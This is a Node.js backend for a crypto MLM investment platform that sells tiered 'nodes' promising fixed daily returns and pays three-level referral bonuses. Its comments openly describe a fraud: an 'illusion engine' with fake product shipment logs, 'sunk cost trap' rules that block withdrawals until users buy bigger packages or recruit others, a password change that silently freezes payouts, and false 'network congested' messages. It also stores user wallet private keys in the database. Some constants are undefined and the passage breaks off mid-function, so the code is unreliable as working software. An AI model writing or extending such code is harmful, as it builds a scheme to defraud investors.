require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { rateLimit, ipKeyGenerator } = require('express-rate-limit'); // SECURITY UPGRADE
const { createClient } = require('@supabase/supabase-js');
const path = require('path');
const cron = require('node-cron');
const { TronWeb } = require('tronweb');
const axios = require('axios');
const { ethers } = require('ethers');

const app = express();
app.set('trust proxy', 1); // <--- Add this line!
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);


const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { "TRON-PRO-API-KEY": process.env.TRON_API_KEY },
    privateKey: process.env.HOT_WALLET_TRON_PRIVATE_KEY // <--- THIS FIXES THE ERROR
});

// --- SECURITY: RATE LIMITERS (Library-Native) ---

const signupLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, 
    max: 5, 
    keyGenerator: ipKeyGenerator, // Use the library's official helper
    message: { error: "Too many accounts created from this IP, please try again after 15 minutes." }
});

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10, 
    keyGenerator: ipKeyGenerator, // Use the library's official helper
    message: { error: "Too many login attempts, please try again later." }
});

// Utility: Generate 6-Digit Numeric Partner ID
function generatePartnerId() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Utility: Micro-pause to prevent API Rate-Limit Bans
const delay = ms => new Promise(res => setTimeout(res, ms));

// --- SECURITY: JWT AUTHENTICATION MIDDLEWARE ---
function verifyToken(req, res, next) {
    const token = req.header('Authorization');
    if (!token) return res.status(401).json({ error: "Access Denied. No token provided." });

    try {
        // Remove "Bearer " from the string
        const verified = jwt.verify(token.replace('Bearer ', ''), process.env.JWT_SECRET);
        req.user = verified; // This holds the user's ID and Partner ID
        next();
    } catch (err) {
        res.status(400).json({ error: "Invalid Token." });
    }
}

// Default route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// --- THE NEW TIERED PACKAGE SYSTEM ---
// In a live environment, you'd lower this to spread the daily yield across 24 hours.
// --- EXACT MATHEMATICAL PACKAGES (288 Cycles / Day) ---
const packages = {
    'micro': { name: 'Micro-Arbitrage', price: 10.00, cycleProfit: 0.0062 },     // ~$1.78 / day
    'starter': { name: 'Starter Retail', price: 50.00, cycleProfit: 0.0330 },    // ~$9.50 / day
    'basic': { name: 'Basic Wholesale', price: 200.00, cycleProfit: 0.1388 },    // ~$40.00 / day
    'pro': { name: 'Wholesale Prime', price: 800.00, cycleProfit: 0.6076 },      // ~$175.00 / day
    'global': { name: 'Global Dist.', price: 2500.00, cycleProfit: 2.0833 },     // ~$600.00 / day
    'enterprise': { name: 'Enterprise Synd.', price: 6000.00, cycleProfit: 5.5555 },// ~$1600.00 / day
    'master': { name: 'Apex Master', price: 15000.00, cycleProfit: 15.6250 }     // ~$4500.00 / day
};

// --- HARDCODED PRODUCT CACHE ---
const productCache = require('./products');

// --- STREAMLINED REGISTRATION ENDPOINT (With Phone Number) ---
app.post('/api/signup', signupLimiter, async (req, res) => {
    // Added 'phone' back in
    const { name, email, password, verifyPassword, partnerId, phone } = req.body;

    if (!name || !email || !password || !partnerId) {
        return res.status(400).json({ error: "All fields are required." });
    }
    if (password !== verifyPassword) {
        return res.status(400).json({ error: "Passwords do not match." });
    }
    if (password.length < 6) {
        return res.status(400).json({ error: "Password must be at least 6 characters long." });
    }

    try {
        let sponsorPath = '';

        // 2. Validate the Sponsor & Get their LTREE path
        if (partnerId === '888888') {
            sponsorPath = '888888'; 
        } else {
            const { data: sponsor, error: sponsorErr } = await supabase
                .from('users').select('my_partner_id, path').eq('my_partner_id', partnerId).single();

            if (!sponsor || sponsorErr) return res.status(400).json({ error: "Invalid Partner ID." });
            sponsorPath = sponsor.path;
        }

        // 3. Security: Hash Password
        const salt = await bcrypt.genSalt(10);
        const password_hash = await bcrypt.hash(password, salt);

        // 4. Generate New Partner ID
        let newPartnerId = generatePartnerId();
        const newPath = `${sponsorPath}.${newPartnerId}`;

        // 5. Generate Wallets
        const account = await tronWeb.createAccount();
        const evmWallet = ethers.Wallet.createRandom();

        // 6. Insert into Database (Simplified with phone)
        const { error } = await supabase.from('users').insert([{ 
            name, email, password_hash, phone, // Added phone back
            my_partner_id: newPartnerId, referred_by: partnerId,
            path: newPath,
            deposit_address: account.address.base58,
            deposit_private_key: account.privateKey,
            evm_address: evmWallet.address,
            evm_private_key: evmWallet.privateKey
        }]);

        if (error) throw error;
        res.status(201).json({ message: "Agency Node Registered successfully." });

    } catch (err) {
        if (err.code === '23505') return res.status(400).json({ error: "Email already registered." });
        console.error(err);
        res.status(500).json({ error: "Network error during registration." });
    }
});

app.post('/api/login', loginLimiter, async (req, res) => {
    const { contact, password } = req.body;
    console.log("[LOGIN ATTEMPT] Contact:", contact); // Debug line

    try {
        let userQuery = supabase.from('users').select('*');

        if (contact.includes('@')) {
            userQuery = userQuery.eq('email', contact);
        } else {
            userQuery = userQuery.eq('phone', contact);
        }

        const { data: user, error } = await userQuery.single();

        if (error || !user) {
            console.log("[LOGIN FAIL] User not found in DB."); // Debug line
            return res.status(400).json({ error: "Invalid credentials." });
        }

        const validPassword = await bcrypt.compare(password, user.password_hash);
        if (!validPassword) {
            console.log("[LOGIN FAIL] Password mismatch."); // Debug line
            return res.status(400).json({ error: "Invalid credentials." });
        }

        const token = jwt.sign({ id: user.id, email: user.email, partner_id: user.my_partner_id }, process.env.JWT_SECRET, { expiresIn: '24h' });

        res.json({ token, partner_id: user.my_partner_id, name: user.name, balance: user.balance });
    } catch (err) {
        console.error("[LOGIN SYSTEM ERROR]", err);
        res.status(500).json({ error: "Server error." });
    }
});

// --- ACCOUNT HISTORY ENDPOINT ---
app.get('/api/history', verifyToken, async (req, res) => {
    try {
        const { data: history, error } = await supabase
            .from('account_history')
            .select('*')
            .eq('user_id', req.user.id)
            .order('created_at', { ascending: false })
            .limit(50); // Show last 50 actions

        if (error) throw error;
        res.json(history);
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Failed to fetch history." });
    }
});

// ==========================================
// THE ILLUSION ENGINE & MLM PAYOUT SYSTEM
// ==========================================

// Fake products to make the logs look highly realistic
const fakeProducts =[
    "500x Smartwatches (Shenzhen -> Dubai)", 
    "200x LED Monitors (Guangzhou -> Kabul)", 
    "1000x Wireless Earbuds (Zhejiang -> Tehran)",
    "Bulk Apparel Lot (Dhaka -> Riyadh)"
];

// --- FULLY AUTOMATED OMNI-CHAIN WITHDRAWAL ENGINE (TRAP + ATOMIC LOCK) ---
app.post('/api/withdraw', verifyToken, async (req, res) => {
    const { amount, walletAddress, network } = req.body; 
    const userId = req.user.id;
    const partnerId = req.user.partner_id;
    const withdrawAmount = Math.abs(amount); // Ensure strictly positive number

    const AUTO_WITHDRAW_LIMIT = 50.00; 

    // 1. Network-Specific Minimums & Format Validation
    if (!withdrawAmount || !walletAddress || withdrawAmount <= 0 || !network) {
        return res.status(400).json({ error: "Invalid withdrawal parameters." });
    }
    if (network === 'TRC20' && (!walletAddress.startsWith('T') || walletAddress.length !== 34)) {
        return res.status(400).json({ error: "Invalid TRC20 wallet address format." });
    }
    if ((network === 'BEP20' || network === 'ERC20') && !ethers.isAddress(walletAddress)) {
        return res.status(400).json({ error: "Invalid BSC/ETH wallet address format." });
    }
    if (network === 'TRC20' && withdrawAmount < 5.00) {
        return res.status(400).json({ error: "Minimum withdrawal for TRC20 is 5.00 USDT." });
    }
    if ((network === 'BEP20' || network === 'ERC20') && withdrawAmount < 1.00) {
        return res.status(400).json({ error: "Minimum withdrawal for EVM networks is 1.00 USDT." });
    }

    try {
        // 2. Fetch User Data for Traps and Cooldown
        const { data: user, error: userErr } = await supabase
            .from('users')
            .select('balance, last_withdrawal_at, agency_tier, package_price')
            .eq('id', userId)
            .single();

        if (userErr) throw userErr;

        // 3. THE SUNK COST TRAP #1: Minimum $50 Node Required
        // Even if they have the $10 Micro Node, they remain locked.
        if (!user.package_price || user.package_price < 50) {
            const currentStatus = (user.agency_tier && user.agency_tier !== 'None') ? user.agency_tier : "Unfunded";
            return res.status(403).json({
                error: "TRAP",
                message: "Withdrawal Locked: Insufficient Node Capacity. You must deploy a Starter Retail Node ($50 minimum) to activate the secure withdrawal gateway.",
                required: "Starter Retail Node ($50)",
                current: currentStatus
            });
        }

        // 4. THE SUNK COST TRAP #2: Node Capacity Limits
        let maxWithdrawal = 0;
        let requiredUpgrade = "";

        // The $10 node is excluded because it's caught by Trap #1
        if (user.package_price < 200) { maxWithdrawal = 100; requiredUpgrade = "Basic Wholesale ($200)"; }
        else if (user.package_price < 800) { maxWithdrawal = 400; requiredUpgrade = "Wholesale Prime ($800)"; }
        else if (user.package_price < 2500) { maxWithdrawal = 1500; requiredUpgrade = "Global Distribution ($2,500)"; }
        else if (user.package_price < 6000) { maxWithdrawal = 5000; requiredUpgrade = "Enterprise Syndicate ($6,000)"; }
        else { maxWithdrawal = 999999; } // Enterprise and Master have no limits

        if (withdrawAmount > maxWithdrawal) {
            return res.status(403).json({
                error: "TRAP",
                message: `Withdrawal Restricted: Your requested liquidity exceeds your Node's Class limit ($${maxWithdrawal}). You must upgrade to a ${requiredUpgrade} Node to process this volume.`,
                required: requiredUpgrade,
                current: user.agency_tier
            });
        }

        // 5. Cooldown Validation
        if (user.last_withdrawal_at) {
            const hoursSinceLast = Math.abs(new Date() - new Date(user.last_withdrawal_at)) / 36e5;
            if (hoursSinceLast < 24) {
                return res.status(400).json({ error: `Security limit reached. 1 payout permitted per 24 hours. Try again in ${Math.ceil(24 - hoursSinceLast)} hours.` });
            }
        }

        // 6. The Network Scaling Trap (Limits to $50 if < 3 referrals)
        const { count: networkSize } = await supabase.from('users').select('*', { count: 'exact', head: true }).eq('referred_by', partnerId);

        if (networkSize < 3 && withdrawAmount > AUTO_WITHDRAW_LIMIT) {
            return res.status(403).json({ 
                error: "TRAP", 
                message: `Tier 1 Nodes are restricted to a maximum withdrawal of $${AUTO_WITHDRAW_LIMIT.toFixed(2)}. Scale your syndicate to unlock higher limits.`, 
                required: "3 Active Sub-Agencies", 
                current: networkSize
            });
        }

        // 7. THE ATOMIC LOCK (Prevents Double-Spend Race Conditions)
        const { data: isSuccess, error: lockErr } = await supabase.rpc('secure_deduct_balance', { 
            row_id: userId, 
            deduct_amount: withdrawAmount 
        });

        if (lockErr || !isSuccess) {
            return res.status(400).json({ error: "Insufficient ledger balance or transaction rejected." });
        }

        // 8. Update Cooldown Timer & Log History
        await supabase.from('account_history').insert([{ 
            user_id: userId, action_type: 'WITHDRAW', description: `Requested withdrawal via ${network}.`, amount: -withdrawAmount 
        }]);
        await supabase.from('users').update({ last_withdrawal_at: new Date().toISOString() }).eq('id', userId);

        // 9. THE LIVE OMNI-CHAIN ROUTER
        try {
            let txHash = "";

            if (network === 'TRC20') {
                const hotWalletTron = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    headers: { "TRON-PRO-API-KEY": process.env.TRON_API_KEY },
                    privateKey: process.env.HOT_WALLET_TRON_PRIVATE_KEY
                });

                const contract = await hotWalletTron.contract().at(USDT_CONTRACT);
                const hotWalletAddress = hotWalletTron.address.fromPrivateKey(process.env.HOT_WALLET_TRON_PRIVATE_KEY);

                const balanceStr = await contract.balanceOf(hotWalletAddress).call();
                if ((parseInt(balanceStr.toString()) / 1e6) < withdrawAmount) throw new Error("Insufficient Hot Wallet Funds");

                const amountInSun = hotWalletTron.toBigNumber(withdrawAmount * 1e6);
                txHash = await contract.transfer(walletAddress, amountInSun).send({ feeLimit: 150000000 });

            } else if (network === 'BEP20' || network === 'ERC20') {
                const provider = network === 'BEP20' ? bscProvider : ethProvider;
                const contractAddr = network === 'BEP20' ? BEP20_USDT : ERC20_USDT;
                const decimals = network === 'BEP20' ? 18 : 6;

                const hotWalletEVM = new ethers.Wallet(process.env.HOT_WALLET_EVM_PRIVATE_KEY, provider);
                const contract = new ethers.Contract(contractAddr,[
                    'function transfer(address to, uint256 value) returns (bool)',
                    'function balanceOf(address owner) view returns (uint256)'
                ], hotWalletEVM);

                const hotBal = await contract.balanceOf(hotWalletEVM.address);
                if (Number(ethers.formatUnits(hotBal, decimals)) < withdrawAmount) throw new Error("Insufficient Hot Wallet Funds");

                const amountInWei = ethers.parseUnits(withdrawAmount.toString(), decimals);
                const tx = await contract.transfer(walletAddress, amountInWei);
                txHash = tx.hash;
            }

            console.log(`[HOT WALLET] Dispatched $${withdrawAmount} to ${walletAddress} via ${network}. TX: ${txHash}`);
            await supabase.from('withdrawals').insert([{
                user_id: userId, amount: withdrawAmount, wallet_address: walletAddress, status: 'paid_auto'
            }]);

            return res.json({ message: `Withdrawal processed instantly on ${network}. Funds dispatched.` });

        } catch (chainErr) {
            console.error(`[HOT WALLET ERROR - ${network}] Routing to pending:`, chainErr.message);
            await supabase.from('withdrawals').insert([{
                user_id: userId, amount: withdrawAmount, wallet_address: walletAddress, status: 'pending'
            }]);
            return res.json({ message: "Network congested. Withdrawal routed to manual compliance queue (ETA: 1-12 hours)." });
        }

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Failed to process withdrawal request." });
    }
});

// --- TEST: INSTANT DEPOSIT ---
app.post('/api/test-deposit', verifyToken, async (req, res) => {
    try {
        await supabase.rpc('increment_balance', { row_id: req.user.id, amount: 100.00 });

        // Log it as a real deposit
        await supabase.from('deposits').insert([{
            user_id: req.user.id,
            tx_hash: `TEST-DEP-${Date.now()}`,
            amount: 100.00
        }]);

        res.json({ message: "$100 USDT Test Deposit Successful." });
    } catch (err) {
        res.status(500).json({ error: "Deposit failed." });
    }
});

// --- PURCHASE AGENCY & DUAL-ENGINE COMPENSATION (INSTANT + MILESTONES) ---
app.post('/api/buy-agency', verifyToken, async (req, res) => {
    const { packageId } = req.body;
    const userId = req.user.id;

    const packages = {
        'micro': { name: 'Micro-Arbitrage', price: 10.00, cycleProfit: 0.0062 },
        'starter': { name: 'Starter Retail', price: 50.00, cycleProfit: 0.0330 },
        'basic': { name: 'Basic Wholesale', price: 200.00, cycleProfit: 0.1388 },
        'pro': { name: 'Wholesale Prime', price: 800.00, cycleProfit: 0.6076 },
        'global': { name: 'Global Dist.', price: 2500.00, cycleProfit: 2.0833 },
        'enterprise': { name: 'Enterprise Synd.', price: 6000.00, cycleProfit: 5.5555 },
        'master': { name: 'Apex Master', price: 15000.00, cycleProfit: 15.6250 }
    };

    const newPkg = packages[packageId];
    if (!newPkg) return res.status(400).json({ error: "Invalid package." });

    try {
        const { data: user, error: userErr } = await supabase
            .from('users').select('balance, package_price, path').eq('id', userId).single();

        if (user.balance < newPkg.price) return res.status(400).json({ error: "Insufficient ledger balance." });

        // 1. Deduct funds
        await supabase.rpc('increment_balance', { row_id: userId, amount: -newPkg.price });

        await supabase.from('account_history').insert([{ 
            user_id: userId, action_type: 'DEPLOY', description: `Deployed ${newPkg.name}.`, amount: -newPkg.price 
        }]);

        // 2. Deploy the 60-Day Smart Contract
        const expiresAt = new Date();
        expiresAt.setDate(expiresAt.getDate() + 60); 

        await supabase.from('active_nodes').insert([{
            user_id: userId,
            package_id: packageId,
            name: newPkg.name,
            price: newPkg.price,
            cycle_profit: newPkg.cycleProfit,
            expires_at: expiresAt.toISOString()
        }]);

        // 3. Update Master Rank
        const currentMaxPrice = parseFloat(user.package_price || 0);
        if (newPkg.price > currentMaxPrice) {
            await supabase.from('users').update({ 
                agency_tier: newPkg.name, 
                package_price: newPkg.price 
            }).eq('id', userId);
        }

        // 4. INSTANT BONUS & MILESTONE ROLLUP (The Dual-Engine)
        if (user.path) {
            const pathArray = user.path.split('.');
            const bonusPercents = { 1: 0.10, 2: 0.03, 3: 0.02 }; // 10%, 3%, 2% Instant Bonuses

            // Traverse exactly 3 levels up
            for (let i = 1; i <= 3; i++) {
                if (pathArray.length >= i + 1) {
                    const sponsorId = pathArray[pathArray.length - (i + 1)].replace('_', '-');

                    // A. Increment their total team volume
                    await supabase.rpc('increment_volume_by_partner_id', { p_id: sponsorId, amount: newPkg.price });

                    const { data: spData } = await supabase.from('users').select('id, team_volume, current_milestone').eq('my_partner_id', sponsorId).single();

                    if (spData) {
                        // B. PAY THE INSTANT DEPOSIT BONUS
                        const instantBonus = (newPkg.price * bonusPercents[i]).toFixed(2);
                        await supabase.rpc('increment_balance', { row_id: spData.id, amount: parseFloat(instantBonus) });

                        await supabase.from('activity_logs').insert([{
                            user_id: spData.id, 
                            message: `[SYSTEM] Level ${i} Direct Activation Bonus! Partner deployed ${newPkg.name}.`, 
                            profit_amount: parseFloat(instantBonus)
                        }]);

                        // C. CHECK FOR MILESTONES (Using updated projected volume)
                        let mBonus = 0; 
                        let newMilestone = spData.current_milestone;
                        let currentVol = parseFloat(spData.team_volume);

                        if (currentVol >= 100000 && spData.current_milestone < 4) { mBonus = 3000; newMilestone = 4; }
                        else if (currentVol >= 50000 && spData.current_milestone < 3) { mBonus = 1200; newMilestone = 3; }
                        else if (currentVol >= 20000 && spData.current_milestone < 2) { mBonus = 400; newMilestone = 2; }
                        else if (currentVol >= 5000 && spData.current_milestone < 1) { mBonus = 100; newMilestone = 1; }

                        if (mBonus > 0) {
                            await supabase.rpc('increment_balance', { row_id: spData.id, amount: mBonus });
                            await supabase.from('users').update({ current_milestone: newMilestone }).eq('id', spData.id);
                            await supabase.from('activity_logs').insert([{
                                user_id: spData.id, message: `[SYSTEM] Milestone ${newMilestone} Achieved! Corporate Bonus Released.`, profit_amount: mBonus
                            }]);
                        }
                    }
                }
            }
        }
        res.json({ message: `Successfully deployed ${newPkg.name}. Contract active for 60 Days.` });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Deployment failed." });
    }
});


// --- DASHBOARD DATA ENDPOINT (WITH LIFETIME STATS) ---
app.get('/api/dashboard', verifyToken, async (req, res) => {
    try {
        const userId = req.user.id;
        const partnerId = req.user.partner_id;

        // 1. Get User Profile
        const { data: userProfile, error: profileErr } = await supabase
            .from('users')
            .select('name, balance, my_partner_id, is_active, shift_expires_at, deposit_address, evm_address, agency_tier, team_volume')
            .eq('id', userId)
            .single();

        if (profileErr) throw profileErr;

        // 2. Calculate Network Size
        const { count: networkSize } = await supabase
            .from('users')
            .select('*', { count: 'exact', head: true })
            .eq('referred_by', partnerId);

        // 3. Fetch recent logs
        const { data: logs } = await supabase
            .from('activity_logs')
            .select('message, profit_amount, created_at')
            .eq('user_id', userId)
            .order('created_at', { ascending: false })
            .limit(10);

        // 4. Fetch Active Nodes (Fleet)
        const { data: fleet } = await supabase
            .from('active_nodes')
            .select('name, price, expires_at')
            .eq('user_id', userId)
            .eq('is_active', true);

        // 5. CALCULATE PERSONAL LIFETIME STATS
        const { data: deposits } = await supabase.from('deposits').select('amount').eq('user_id', userId);
        const totalDeposits = deposits ? deposits.reduce((sum, tx) => sum + Number(tx.amount), 0) : 0;

        const { data: withdrawals } = await supabase.from('withdrawals').select('amount').eq('user_id', userId).like('status', 'paid%');
        const totalWithdrawals = withdrawals ? withdrawals.reduce((sum, tx) => sum + Number(tx.amount), 0) : 0;

        const { data: commissions } = await supabase.from('activity_logs').select('profit_amount').eq('user_id', userId).gt('profit_amount', 0);
        const totalCommissions = commissions ? commissions.reduce((sum, log) => sum + Number(log.profit_amount), 0) : 0;

        res.json({
            profile: userProfile,
            network_size: networkSize || 0,
            recent_activity: logs || [],
            fleet: fleet ||[],
            lifetime_stats: {
                deposits: totalDeposits,
                withdrawals: totalWithdrawals,
                commissions: totalCommissions
            }
        });

    } catch (err) {
        console.error("Dashboard API Error:", err);
        res.status(500).json({ error: "Failed to fetch dashboard data." });
    }
});

// --- UPDATE PASSWORD ENDPOINT ---
app.post('/api/update-password', verifyToken, async (req, res) => {
    const { oldPassword, newPassword } = req.body;
    const userId = req.user.id;

    if (!oldPassword || !newPassword || newPassword.length < 6) {
        return res.status(400).json({ error: "Invalid password format. Minimum 6 characters." });
    }

    try {
        // 1. Fetch user to verify old password
        const { data: user, error: userErr } = await supabase
            .from('users')
            .select('password_hash')
            .eq('id', userId)
            .single();

        if (userErr) throw userErr;

        // 2. Verify Old Password
        const validPassword = await bcrypt.compare(oldPassword, user.password_hash);
        if (!validPassword) {
            return res.status(400).json({ error: "Current password is incorrect." });
        }

        // 3. Hash New Password
        const salt = await bcrypt.genSalt(10);
        const new_password_hash = await bcrypt.hash(newPassword, salt);

        // 4. Update Database (and reset withdrawal timer as a "security measure")
        await supabase.from('users').update({ 
            password_hash: new_password_hash,
            last_withdrawal_at: new Date().toISOString() // Locks withdrawals for 24h as a "security feature"
        }).eq('id', userId);

        // Log the security action
        await supabase.from('account_history').insert([{ 
            user_id: userId, action_type: 'SECURITY', description: `Account password modified.`, amount: 0 
        }]);

        res.json({ message: "Security Update Successful. Password changed." });

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Failed to update security credentials." });
    }
});

// --- PUBLIC NETWORK TREE & SEARCH ENDPOINT ---
// --- PERSISTENT NOTIFICATIONS ENDPOINT (STRICT FILTER) ---
app.get('/api/notifications', verifyToken, async (req, res) => {
    try {
        const userId = req.user.id;

        // STRICT FILTER: We ONLY want Direct Activation Bonuses and Milestones. 
        // We explicitly EXCLUDE anything with the word "Override" (the 5-minute drip).
        const { data: notifs, error } = await supabase
            .from('activity_logs')
            .select('id, message, profit_amount, created_at')
            .eq('user_id', userId)
            .or('message.ilike.%Activation Bonus%,message.ilike.%Milestone%')
            .order('created_at', { ascending: false })
            .limit(15); // Show last 15 major events

        if (error) throw error;

        res.json(notifs || []);

    } catch (err) {
        console.error("[NOTIF API ERROR]", err.message);
        res.status(500).json({ error: "Failed to sync notifications." });
    }
});
// --- TEAM ANALYTICS COMMAND CENTER ENDPOINT (DUAL-ENGINE MATH) ---
app.get('/api/team-stats', verifyToken, async (req, res) => {
    try {
        const userId = req.user.id;

        const { data: currentUser, error: pathErr } = await supabase.from('users').select('path').eq('id', userId).single();
        if (pathErr || !currentUser.path) return res.status(400).json({ error: "Path error." });

        const myPathLength = currentUser.path.split('.').length;

        const { data: team } = await supabase.from('users')
            .select('id, path, package_price')
            .like('path', `${currentUser.path}.%`); 

        let stats = {
            teamSize: team ? team.length : 0,
            validMembers: 0,
            totalRecharge: 0,
            totalWithdrawal: 0,
            levels: {
                1: { registered: 0, valid: 0, income: 0, bonus: 0 }, // Added 'bonus' tracker
                2: { registered: 0, valid: 0, income: 0, bonus: 0 },
                3: { registered: 0, valid: 0, income: 0, bonus: 0 }
            }
        };

        if (team && team.length > 0) {
            const teamIds = team.map(u => u.id);

            team.forEach(u => {
                const depth = u.path.split('.').length - myPathLength;
                const isValid = parseFloat(u.package_price || 0) > 0; 

                if (isValid) stats.validMembers++;

                if (depth >= 1 && depth <= 3) {
                    stats.levels[depth].registered++;
                    if (isValid) stats.levels[depth].valid++;
                }
            });

            const { data: deposits } = await supabase.from('deposits').select('amount').in('user_id', teamIds);
            if (deposits) stats.totalRecharge = deposits.reduce((sum, tx) => sum + Number(tx.amount), 0);

            const { data: withdrawals } = await supabase.from('withdrawals').select('amount').in('user_id', teamIds).like('status', 'paid%');
            if (withdrawals) stats.totalWithdrawal = withdrawals.reduce((sum, tx) => sum + Number(tx.amount), 0);
        }

        // 6. Calculate override earnings using high-speed RPC
        const { data: incomeStats, error: incErr } = await supabase.rpc('get_user_income_stats', { target_user_id: userId });

        if (!incErr && incomeStats) {
            stats.levels[1].income = incomeStats.l1_inc;
            stats.levels[2].income = incomeStats.l2_inc;
            stats.levels[3].income = incomeStats.l3_inc;

            stats.levels[1].bonus = incomeStats.l1_bon;
            stats.levels[2].bonus = incomeStats.l2_bon;
            stats.levels[3].bonus = incomeStats.l3_bon;
        }

        res.json(stats);
    } catch (err) {
        console.error("[TEAM STATS ERROR]", err);
        res.status(500).json({ error: "Failed to fetch team analytics." });
    }
});

// 1. Route for when the user clicks "View My Syndicate" (No partnerId provided)
app.get('/api/network-tree', verifyToken, async (req, res) => {
    handleNetworkTree(req.user.partner_id, res);
});

// 2. Route for when the user searches for a specific Partner ID
app.get('/api/network-tree/:partnerId', verifyToken, async (req, res) => {
    handleNetworkTree(req.params.partnerId, res);
});

// Helper function to avoid duplicate code
async function handleNetworkTree(targetId, res) {
    try {
        const formattedId = targetId.replace('-', '_');

        // 1. Fetch the "Root" user being searched
        const { data: rootUser, error: rootErr } = await supabase
            .from('users')
            .select('name, my_partner_id, agency_tier, balance, referred_by, path')
            .eq('my_partner_id', targetId)
            .single();

        if (rootErr || !rootUser) {
            return res.status(404).json({ error: "Partner Node not found." });
        }

        // 2. Fetch all descendants (Anyone whose path contains this user's formatted ID)
        const { data: descendants, error: descErr } = await supabase
            .from('users')
            .select('name, my_partner_id, agency_tier, balance, referred_by, path')
            .like('path', `${rootUser.path}%`); // Using the actual path for exact subtree filtering

        if (descErr) throw descErr;

        res.json({ root: rootUser, network: descendants });

    } catch (err) {
        console.error("[TREE ERROR]", err);
        res.status(500).json({ error: "Failed to fetch network topology." });
    }
}

// --- ON-DEMAND DEPOSIT SCANNER (User-Triggered) ---
// Prevents users from spamming the blockchain RPC and getting your API banned
const depositCheckLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 Minute cooldown
    max: 1, 
    keyGenerator: ipKeyGenerator,
    message: { error: "Blockchain sync in progress. Please wait 60 seconds before scanning again." }
});

app.post('/api/verify-deposit', verifyToken, depositCheckLimiter, async (req, res) => {
    const userId = req.user.id;

    try {
        const { data: user, error } = await supabase
            .from('users')
            .select('deposit_address, deposit_private_key, evm_address, evm_private_key, trc_sweep_pending, evm_sweep_pending')
            .eq('id', userId).single();

        if (error) throw error;

        // --- THE PATCH ---
        if (user.trc_sweep_pending || user.evm_sweep_pending) {
            return res.status(400).json({ 
                error: "Please wait 10 minutes before scanning for new deposits." 
            });
        }

        let totalFound = 0;
        let messages =[];

        // 1. Instantly check Tron (TRC20)
        if (user.deposit_address) {
            const globalContract = await tronWeb.contract().at(USDT_CONTRACT);
            const balanceStr = await globalContract.balanceOf(user.deposit_address).call();
            const balanceUSDT = parseInt(balanceStr.toString()) / 1e6;

            if (user.deposit_address) {
                const globalContract = await tronWeb.contract().at(USDT_CONTRACT);
                const balanceStr = await globalContract.balanceOf(user.deposit_address).call();
                const balanceUSDT = parseInt(balanceStr.toString()) / 1e6;

                if (balanceUSDT > 0) {
                    // Credit the user immediately AND SET THE SWEEP FLAG
                    await supabase.rpc('increment_balance', { row_id: userId, amount: balanceUSDT });
                    await supabase.from('users').update({ trc_sweep_pending: true }).eq('id', userId); // <--- THE TRIGGER

                    await supabase.from('deposits').insert([{ user_id: userId, tx_hash: `MANUAL-TRC-${Date.now()}`, amount: balanceUSDT }]);
                    await supabase.from('account_history').insert([{ user_id: userId, action_type: 'DEPOSIT', description: `External deposit processed via TRC20.`, amount: balanceUSDT }]);

                    totalFound += balanceUSDT;
                    messages.push(`TRC20: +$${balanceUSDT.toFixed(2)}`);
                }
            }
        }

        // 2. Instantly check BSC (BEP20)
        if (user.evm_address) {
            const bscBal = await bscUsdtContract.balanceOf(user.evm_address);
            const bscUSDT = Number(ethers.formatUnits(bscBal, 18));

            if (user.evm_address) {
                const bscBal = await bscUsdtContract.balanceOf(user.evm_address);
                const bscUSDT = Number(ethers.formatUnits(bscBal, 18));

                if (bscUSDT > 0) {
                    // Credit the user immediately AND SET THE SWEEP FLAG
                    await supabase.rpc('increment_balance', { row_id: userId, amount: bscUSDT });
                    await supabase.from('users').update({ evm_sweep_pending: true }).eq('id', userId); // <--- THE TRIGGER

                    await supabase.from('deposits').insert([{ user_id: userId, tx_hash: `MANUAL-EVM-${Date.now()}`, amount: bscUSDT }]);
                    await supabase.from('account_history').insert([{ user_id: userId, action_type: 'DEPOSIT', description: `External deposit processed via BEP20.`, amount: bscUSDT }]);

                    totalFound += bscUSDT;
                    messages.push(`BEP20: +$${bscUSDT.toFixed(2)}`);
                }
            }
        }

        // 3. Return the result
        if (totalFound > 0) {
            res.json({ message: `Deposit Confirmed! Added $${totalFound.toFixed(2)} to your ledger.`, details: messages.join(' | ') });
        } else {
            res.status(400).json({ error: "No new deposits found on the blockchain. Confirmations take 1-3 minutes. Try again shortly." });
        }

    } catch (err) {
        console.error("[MANUAL SCAN ERROR]", err);
        res.status(500).json({ error: "Blockchain node connection error. Try again shortly." });
    }
});

// ==========================================
// ADMIN CONTROL ROOM (GOD-MODE API)
// ==========================================

// --- SECURITY: Admin Authentication Middleware (Password Only) ---
function verifyAdmin(req, res, next) {
    // 1. Express lowercases headers automatically. We check for 'admin-password'.
    const adminPass = req.header('admin-password');

    // 2. Strict comparison to your .env file
    if (!adminPass || adminPass !== process.env.ADMIN_PASSWORD) {
        console.log("[ADMIN FAILED] Invalid or missing Master Key.");
        return res.status(403).json({ error: "Forbidden: Invalid Admin Password" });
    }

    // 3. Ensure they are also logged into a user session (to grab req.user.id if needed)
    verifyToken(req, res, next);
}

// --- ADMIN: Master Ledger & Withdrawal Queue ---
app.get('/api/admin/overview', verifyAdmin, async (req, res) => {
    try {
        const { data: totals, error: totalsErr } = await supabase.rpc('get_platform_totals');
        if (totalsErr) throw totalsErr;

        const { data: pending, error: pendingErr } = await supabase.from('withdrawals')
            .select('*, users(name, my_partner_id)')
            .eq('status', 'pending')
            .order('created_at', { ascending: true });
        if (pendingErr) throw pendingErr;

        res.json({ totals: totals[0], pending_withdrawals: pending });
    } catch (err) {
        res.status(500).json({ error: "Failed to fetch admin overview." });
    }
});

// --- ADMIN: Approve or Reject a Withdrawal ---
app.post('/api/admin/process-withdrawal', verifyAdmin, async (req, res) => {
    const { withdrawalId, action } = req.body; // action can be 'approve' or 'reject'

    if (action === 'approve') {
